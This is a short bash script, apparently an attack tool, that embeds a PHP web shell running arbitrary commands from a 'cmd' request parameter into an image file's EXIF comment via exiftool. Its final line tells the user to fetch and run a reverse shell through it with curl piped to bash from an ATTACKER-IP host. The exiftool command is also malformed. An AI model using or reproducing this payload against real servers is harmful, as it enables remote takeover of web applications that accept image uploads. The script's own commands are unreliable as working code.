#!/bin/bash
echo "Enter Image Path..."
read path
echo "Injecting $path"
exiftool echo "$path" -Comment="<?php if(isset($_REQUEST['cmd'])){echo '<pre>';$cmd = ($_REQUEST['cmd']);system($cmd);echo '</pre>';} __halt_compiler();?>" > echo "$path"
echo "Finished!"
echo "Please validate the file with: exiftool $path!"
echo "---------------------------------------------"
echo "Upload a reverse shell with: ?cmd=curl+http%3a//ATTACKER-IP:ATTACKER-PORT/shell.sh+|+bash"
